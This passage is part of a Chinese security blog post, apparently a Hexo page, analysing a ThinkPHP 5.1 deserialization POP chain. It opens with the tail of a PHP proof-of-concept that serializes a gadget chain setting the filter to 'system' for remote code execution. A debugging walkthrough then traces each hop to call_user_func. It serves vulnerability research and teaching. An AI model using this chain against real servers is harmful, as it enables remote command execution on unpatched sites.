    <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,  </span><br><span class="line">            <span class="comment">// 表单ajax伪装变量  </span></span><br><span class="line">            <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;&#x27;</span>,  <span class="comment">//这是用来符合isAjax方法的  </span></span><br><span class="line">            <span class="comment">// 表单pjax伪装变量  </span></span><br><span class="line">            <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,  </span><br><span class="line">            <span class="comment">// PATHINFO变量名 用于兼容模式  </span></span><br><span class="line">            <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,  </span><br><span class="line">            <span class="comment">// 兼容PATH_INFO获取  </span></span><br><span class="line">            <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],  </span><br><span class="line">            <span class="comment">// 默认全局过滤方法 用逗号分隔多个  </span></span><br><span class="line">            <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,  </span><br><span class="line">            <span class="comment">// 域名根，如thinkphp.cn  </span></span><br><span class="line">            <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,  </span><br><span class="line">            <span class="comment">// HTTPS代理标识  </span></span><br><span class="line">            <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,  </span><br><span class="line">            <span class="comment">// IP代理获取标识  </span></span><br><span class="line">            <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,  </span><br><span class="line">            <span class="comment">// URL伪静态后缀  </span></span><br><span class="line">            <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,  </span><br><span class="line">        ];  </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hook[<span class="string">&#x27;visible&#x27;</span>]=[<span class="variable language_">$this</span>,<span class="string">&#x27;isAjax&#x27;</span>];  <span class="comment">//这是用来控制call_user_func_array跳板链接到的方法的  </span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filter=<span class="string">&quot;system&quot;</span>;  <span class="comment">//这是用来控制filter的  </span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">namespace</span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));  <span class="comment">//序列化当然是序列化入口</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://picx.zhimg.com/80/v2-7118fdac3daa25fd4f0c349c8e92d275_1440w.webp"
+                     
+                ></p>
+<h1 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h1><p>下断点，传payload<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic1.zhimg.com/80/v2-73e9d0f6dd0766d7298ba103c488d402_1440w.webp"
+                     
+                ></p>
+<p>观察POC，最外层套的是<code>think\process\pipes\Windows</code>对象，因此会进入该对象中，来到了Windows.php下的<code>__destruct</code>魔术方法，这是我们pop链的起点<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic3.zhimg.com/80/v2-697f224d7df0d29fd99982b6bc307eec_1440w.webp"
+                     
+                ></p>
+<p>close方法用来关闭文件啥没用，关键在removeFiles里，<code>unlink()</code> 可删除文件，这里的filename我们可以控制，存在任意文件删除漏洞，但这并非重点<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic4.zhimg.com/80/v2-c01e3acd4464aba1ec41d7daa1786cbb_1440w.webp"
+                     
+                ></p>
+<p>我们的重点是要RCE。file_exists函数通过路径来判断文件是否存在，其传入的参数需要是一个字符串，我们将filename属性改为了一个<code>think\model]\Pivot</code>对象（为什么是Pivot后面会说），因此会触发它的<code>toString</code>方法，注意这里是第一次跳转，从Windows.php到Conversion.php<br>在这里大家可能会有疑问，不是Pivot对象吗，怎么变成了Conversion：<br>Pivot对象内部没有toString方法，其构造方法调用的是其父类Model类的构造方法。我们再来看Model类，在它的内部复用了被<code>trait</code>修饰的<code>Conversion</code>对象，因此当Pivot被当成字符串输出时，就会调用Conversion类的toString方法<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pica.zhimg.com/80/v2-56fdc7eabfd8e4b8802af4376eeca7f8_1440w.webp"
+                     
+                ></p>
+<p>跟进toJson方法<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic1.zhimg.com/80/v2-f483e62604574c907efe5d70093d9698_1440w.webp"
+                     
+                ></p>
+<p>跟进toArray方法<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic3.zhimg.com/80/v2-ad6d22ac0ee8f11a2a41385aab32853e_1440w.webp"
+                     
+                ></p>
+<p>截出toArray关键部分，最关键的一行代码就是<code>$relation-&gt;visible($name)</code>，这意味这如果我们可以控制relation和name，就可以调用relation这个类的visible方法，且参数由我们控制，或者可以调用relation这个类的<code>__call</code>方法（该类没有visible时就可以自动调用），且参数由我们控制，而之前对tp5RCE中的分析我们也能看出，这个<code>__call</code>很危险，很有可能里面就有call_user_func<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic1.zhimg.com/80/v2-0d71c219a11b71ebb17fa335a84de774_1440w.webp"
+                     
+                ></p>
+<p>那我们就看看该如何控制relation和name，首先看relation如何获取：先是调用了getRelation方法，注意了，这里我们要的是最终走到192行，故这个if必须满足，也就是说getRelation必须返回空，跟进getRelation，看是否可以控制其返回空（这里有个点需要注意一下，这个getRelation并不在Conversion.php中，而是在RelationShip.php中，因为这两都是trait类，这个this指的是进行了多继承的子类（至少同时继承了Conversion和RelationShip），故可以调用在RelationShip.php中的getRelation方法，这是第二次跳转）</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>) //$<span class="title">name</span>=&quot;<span class="title">a</span>&quot;</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>由于<code>$name为a</code>不是null，并且我们没给<code>$this-&gt;relation</code>进行赋值，因此直接return一个null回来，回到toArray中，接下来在getAttr方法中真正获取relation（getAttr方法在Attribute类中，这是第三次跳转）<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pica.zhimg.com/80/v2-aa025fcc6d67b5b177ef3245fd7ca69c_1440w.webp"
+                     
+                ></p>
+<p>跟进getData方法<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic3.zhimg.com/80/v2-af522365c12af2de46c9cb7ea90197ea_1440w.webp"
+                     
+                ></p>
+<p>可以看到我们可以控制data，只需要再控制name即可返回我们构造的值，往回看，传入getData的name就是传入getAttr的参数name，也就是toArray中的key，而key可以通过我们传入的append控制，至此，我们成功控制了relation，而<code>$relation-&gt;visible($name)</code>的参数name也是通过我们传入的append控制。综上所述只需要控制data和append即可（<code>data[key]</code>用来控制relation，<code>append[key]</code>用来控制name）。接下来需要找到一个同时继承了这三个类的子类（Conversion，RelationShip，Attribute），找到了Model.php里的Model类：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://picx.zhimg.com/80/v2-6c33495e0e39f9a44f5f883d15d6cf77_1440w.webp"
+                     
+                ></p>
+<p>但是这里有个问题，Model是一个抽象类，不能直接实例化，我们需要找到具体实现他的一个子类，找到了Pivot类</p>
+<p>全局搜索visible，发现没有一个能用的（内不含危险方法），只能找<code>__call</code>，想起了我们的老朋友Request.php<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pica.zhimg.com/80/v2-03b1051c7b95e1771f52a49db544cdfe_1440w.webp"
+                     
+                ></p>
+<p>可以看到这里有令人安心的call_user_func_array，而且hook可以控制，但是很遗憾，在此之前进行了array_unshift，简单来说就是把this添加到了参数的第一位，如此一来，我们不再能够通过call_user_func_array来直接调用系统命令（因为系统命令参数里面不能加this），转换思路，将call_user_func_array当成一个能够调用Request类内其他方法的跳板（因为加了this）。</p>
+<p>想想之前的tp5RCE，也许我们这次也可以通过覆盖filter来进行RCE，找到filterValue方法：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic3.zhimg.com/80/v2-ea57644726a551e7bd9704b6f4e3cda6_1440w.webp"
+                     
+                ></p>
+<p>我们要想办法利用的就是filterValue里面的call_user_func来最终执行命令，这需要我们控制filter和value，而tp5RCE告诉我们，filter和value都可以在input方法里面控制<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pica.zhimg.com/80/v2-1c0de983c1b42cfb884a07b84455dd30_1440w.webp"
+                     
+                ></p>
+<p>可以看到这个array_walk_recursive，可以将filter和data传入并调用filterValue，而这个filter是通过getFilter获得的，相当于是获得了this-&gt;filter，可以自行控制，对于data的控制我们进入getData<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic3.zhimg.com/80/v2-2da4c237f6839ea8fe03adbcbcb7876a_1440w.webp"
+                     
+                ></p>
+<p>如果我们让name为空就可以跳过这个if，保留data的值。往上找找谁调用了input，是否直接传入了可控的参数，找到了param方法<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic1.zhimg.com/80/v2-13a303ddb2eee3f0cb3207176a196daa_1440w.webp"
+                     
+                ></p>
+<p>可以看到这里终于是可以控制的this-&gt;param，但是基于动态命令执行的宗旨，我们可以不控制param，转而控制get参数（url传就行），于是data已经被控制，接下来只需要控制name为空即可</p>
+<p>param()方法中的name还是不可控。虽然param()方法的默认name是空字符串，但是别忘了我们需要使用__call里面的call_user_func_array来当跳板调用它，第一个参数是this，所以这里name还是不可控，继续往上寻找调用了param的方法看是否可控，找到了isAjax函数：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic3.zhimg.com/80/v2-cd6987ea8592a2344bdb2e0bd45ecc54_1440w.webp"
+                     
+                ></p>
+<p>可以看到这里调用param的第一个参数传入的是<code>$this-&gt;config[&#39;var_ajax&#39;]</code>，我们只需要控制它为空即可成功控制name为空。好了，通过call_user_func_array当跳板调用isAjax，pop链就完成了，只需要再控制一下this的参数，即可实现RCE<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic2.zhimg.com/80/v2-4646781a8d57236d5ecf1e86c30e3ae5_1440w.webp"
+                     
+                ></p>
+<p><strong>参考链接</strong>：<br>两位大佬一个正向分析，一个反向分析，很有收获<br><a class="link"   target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%EF%BC%881%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA" >ThinkPHP5.x反序列化漏洞全复现 - Boogiepop Doesn’t Laugh (boogipop.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://pazuris.cn/2023/08/22/ThinkPHP5-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86%EF%BC%9A" >ThinkPHP5_反序列化分析 | Pazuris - reoreo~~ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Thinkphp5.1 反序列化ajax链</li>
+        <li><strong>Author:</strong> Saofe1a</li>
+        <li><strong>Created at
+                :</strong> 2024-10-10 11:39:55</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-10-10 11:39:08
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://saofeia.github.io/2024/10/10/Thinkphp5.1 反序列化ajax链/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/10/07/Thinkphp5--RCE/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Thinkphp5 RCE</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          recaptchaV3Key: "wasd",
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Thinkphp5.1 反序列化ajax链</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#POC"><span class="nav-text">POC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Debug"><span class="nav-text">Debug</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Saofe1a</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        4 posts in total
+                    </span>
+                    
+                        <span>
+                            7.6k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.4</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
